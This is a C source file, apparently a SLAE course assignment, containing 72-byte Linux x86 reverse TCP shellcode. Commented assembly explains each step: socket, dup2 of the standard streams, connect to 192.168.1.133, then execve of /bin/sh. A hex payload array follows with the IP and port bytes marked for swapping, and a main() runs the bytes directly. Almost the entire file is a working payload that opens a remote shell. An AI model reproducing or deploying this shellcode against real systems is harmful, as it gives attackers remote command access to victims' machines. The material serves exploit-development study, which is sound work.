/*
 *  Linux x86 - Reverse TCP Shell - 72 bytes
 *  Author: xmgv
 *  Details: https://xmgv.wordpress.com/2015/02/21/slae-assignment-2-reverse-shell/
 */

/*
global _start

section .text

_start:
    ; socket(AF_INET, SOCK_STREAM, 0);
    push 0x66           ; socketcall()
    pop eax
    cdq                 ; zero out edx
    push edx            ; protocol
    inc edx
    push edx            ; SOCK_STREAM
    mov ebx, edx        ; socket()
    inc edx
    push edx            ; AF_INET
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; dup2()
    xchg ebx, eax       ; store sockfd in ebx
    mov ecx, edx        ; initialize counter to 2
    loop:
        mov al, 0x3f
        int 0x80
        dec ecx
        jns loop

    ; connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    mov al, 0x66        ; socketcall()
    xchg ebx, edx       ; ebx=2, edx=sockfd
    push 0x8501A8C0     ; 192.168.1.133
    push word 0x3582    ; port
    push word bx        ; AF_INET
    inc ebx             ; connect() -> 3
    mov ecx, esp        ; point to the structure
    push 0x10           ; sizeof(struct sockaddr_in)
    push ecx            ; &serv_addr
    push edx            ; sockfd
    mov ecx, esp        ; load address of the parameter array
    int 0x80            ; call socketcall()

    ; execve(“/bin/sh”, NULL , NULL);
    push 0xb            ; execve()
    pop eax
    cdq                 ; zero out edx
    mov ecx, edx        ; zero out ecx
    push edx            ; push null bytes (terminate string)
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ebx, esp        ; load address of /bin/sh
    int 0x80            ; call execve()
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
"\xc0\xa8\x01\x85"	// <--- ip address
"\x66\x68"
"\x82\x35"			// <--- tcp port
"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main(void) {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}